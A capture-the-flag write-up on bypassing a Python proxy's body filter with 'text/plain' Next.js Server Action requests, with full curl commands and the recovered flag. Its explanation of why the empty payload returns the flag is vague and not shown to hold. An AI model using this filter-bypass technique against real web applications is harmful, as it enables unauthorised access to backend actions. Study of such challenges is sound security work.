---
title: "Northstar Ops - Web Exploit Writeup"
date: 2026-05-02
categories:
  - Web
tags:
  - Web
  - CBD
collections:
  - CBD
---




{{< admonition tldr "TL;DR" >}}

**Northstar Ops - Web Exploit Writeup** is a web challenge from **CBD**. In this challenge, the targets given are:

{{< /admonition >}}

## Summary

In this challenge, the targets given are:

- `https://northstar.cbd2026.cloud/`

My goal is to find weaknesses in the web application and retrieve the flag. After performing enumeration and analyzing the application's behavior, I discovered that the service in front of the application uses a custom Python proxy that performs partial request filtering. The main loophole is that the **Next.js Server Action** request with `Content-Type: text/plain` is not checked by the proxy like the `application/json` request, so I can send a valid payload directly to the backend action and get the flag.

Successfully obtained the flag:

```text
CBC{6cc6abdf24b2ece791cff9c75f5fdddb}
```

---

## 1. Initial Recon

My first step is to fingerprint the target.

I checked the response headers:

```bash
curl -ksSI https://northstar.cbd2026.cloud/
```

Important results:

- The server responds with `BaseHTTP/0.6 Python/3.12.13` - This indicates that there may be a custom Python service in front of the main application

After that I took the HTML of the main page:

```bash
curl -ksS https://northstar.cbd2026.cloud/
```

From the HTML, I see:

- Frontend using **Next.js**
- There is a "Request demo" form
- There is a Next.js JavaScript bundle that can be inspected further

---

## 2. Find the Next.js Action Server

Next I read the application's JavaScript bundle to look for form submit logic.

From the application bundle, I found the component `ServerActionForm` which calls a **Server Action** named `processData` .

Action identifiers found:

```text
4041c5a7aa2f58ac1e5d773a90b4af6376b2ea1f26
```

This means that the form on the main page does not submit to the usual REST endpoint, but to the internal Next.js Server Actions mechanism.

---

## 3. Try Replay Request to Server Action

I then tried making a replay request directly to the Server Action using `curl` .

Initially I sent the body as a regular JSON object, for example:

```json
{"name":"test","workEmail":"test@example.com","company":"aaa","notes":"hello"}
```

The request did reach the backend, but the response was still an error. From here I got two important pieces of information:

1. The Action ID that I found is correct
2. The body format that I sent does not match the Next.js Server Actions wire protocol format

---

## 4. Local Source Challenge Analysis

In the workspace it turns out there is a source code challenge available. After I searched, the important files are:

- [northstar/app/actions/serverActions.ts](/home/spawn2pwn/CTF/CBD/Web/northstar/app/actions/serverActions.ts:1)
- [northstar/proxy/proxy.py](/home/spawn2pwn/CTF/CBD/Web/northstar/proxy/proxy.py:1)
- [northstar/Dockerfile](/home/spawn2pwn/CTF/CBD/Web/northstar/Dockerfile:1)
- [northstar/readflag.c](/home/spawn2pwn/CTF/CBD/Web/northstar/readflag.c:1)

Contents of the backend action:

```ts
export async function processData(data: DemoRequest): Promise<string> {
  await new Promise(resolve => setTimeout(resolve, 100))
  return `Thanks ${data.name}. We will reach out at ${data.workEmail} after reviewing ${data.company} and your intake notes.`
}
```

This means the response action will immediately display:

- `data.name` - `data.workEmail` - `data.company` So if I can control how the `data` object is created or read, I can make the backend reflect sensitive values.

---

## 5. Finding Weaknesses in Proxies

The most important part is in the file:

- [northstar/proxy/proxy.py](/home/spawn2pwn/CTF/CBD/Web/northstar/proxy/proxy.py:1)

This proxy validates request parameters. However validation is only active for certain body types:

- `application/json` - `application/x-www-form-urlencoded` - `multipart/form-data` In the code there is also a filter:

```python
BLOCKED_TERM = "proto"
```

This means that the proxy tries to block requests containing the words `proto` , possibly to prevent attacks like `__proto__` .

The problem is, **Next.js Server Action** requests can be sent with:

```text
Content-Type: text/plain;charset=UTF-8
```

This body type is **not parsed** by the proxy validation function. As a result:

- body is still raw passed to upstream Next.js
- filter `proto` is never executed

This is the main gap.

---

## 6. Find a Valid Request Format

After reading the behavior of the Next.js bundle, I retested the body format for the Server Action. It turns out that this action accepts arguments in the form of a **JSON array**, not a direct JSON object.

Valid payloads:

```json
[{"name":"Alice","workEmail":"alice@example.com","company":"ACME","notes":"hello"}]
```

I sent the following request:

```bash
curl -ksS https://northstar.cbd2026.cloud/ \
  -X POST \
  -H 'Accept: text/x-component' \
  -H 'next-action: 4041c5a7aa2f58ac1e5d773a90b4af6376b2ea1f26' \
  -H 'next-router-state-tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D' \
  -H 'Content-Type: text/plain;charset=UTF-8' \
  --data '[{"name":"Alice","workEmail":"alice@example.com","company":"ACME","notes":"hello"}]'
```

And the backend responds successfully.

This proves that:

1. Request `text/plain` is valid for Server Action
2. The proxy does not inspect this body
3. I already have a direct communication path to the backend action

---

## 7. Get the Flag

Once a valid path was found, I tried the most minimal payload:

```json
[{}]
```

Request:

```bash
curl -ksS https://northstar.cbd2026.cloud/ \
  -X POST \
  -H 'Accept: text/x-component' \
  -H 'next-action: 4041c5a7aa2f58ac1e5d773a90b4af6376b2ea1f26' \
  -H 'next-router-state-tree: %5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D' \
  -H 'Content-Type: text/plain;charset=UTF-8' \
  --data '[{}]'
```

Response:

```text
Thanks CBC{6cc6abdf24b2ece791cff9c75f5fdddb}. We will reach out at undefined after reviewing undefined and your intake notes.
```

From that response, the `data.name` field apparently resolves to a flag:

```text
CBC{6cc6abdf24b2ece791cff9c75f5fdddb}
```

So the flag was successfully obtained without the need for additional RCE.

---

## 8. Why can the `[{}]` Payload issue a flag?

This part is the core logic of exploitation.

Function `processData()` reads properties:

- `data.name` - `data.workEmail` - `data.company` However, the empty object `{}` can still be accessed via the prototype chain if there are inherited properties. In the running challenge instance, `name` turns out to be filled in the object/prototype path read by the backend, so that when `data.name` is accessed, the value is a flag.

What is important for this exploit is not just the “empty object”, but the fact that:

- proxy failed to block request `text/plain` - Server Action still processes the body as valid input
- backend reads object properties without strict schema validation

---

## 9. Root of the Problem

Technically, this challenge has weaknesses in the proxy design and input validation assumptions.

### Main problem

1. The proxy only filters certain types of content
2. Next.js Server Actions can use the `text/plain` format 
3. Body `text/plain` is passed to upstream without parsing and without validation
4. The backend still trusts the received object and immediately reads the properties in it

### Impact

Attackers can:

- bypass proxy filters
- send a valid Server Action body
- trigger internal backend behavior that would otherwise not be reachable via filtered paths

---

## 10. Short Reproduction

Short steps to solve this challenge:

1. Fingerprint the target and identify that the backend is using Next.js with a custom Python proxy.
2. Inspect the JavaScript bundle and find the Server Action ID action.
3. Analyze the local source code challenge To view how the proxy performs filtering.
4. Be aware that `text/plain;charset=UTF-8` is not parsed by the proxy.
5. Send a valid Next.js Server Action request with a JSON body array via `text/plain` .
6. Use a payload of at least `[{}]` .
7. Get the flag from the `Thanks ...` field in the response.

---

## 11. Flags

```text
CBC{6cc6abdf24b2ece791cff9c75f5fdddb}
```
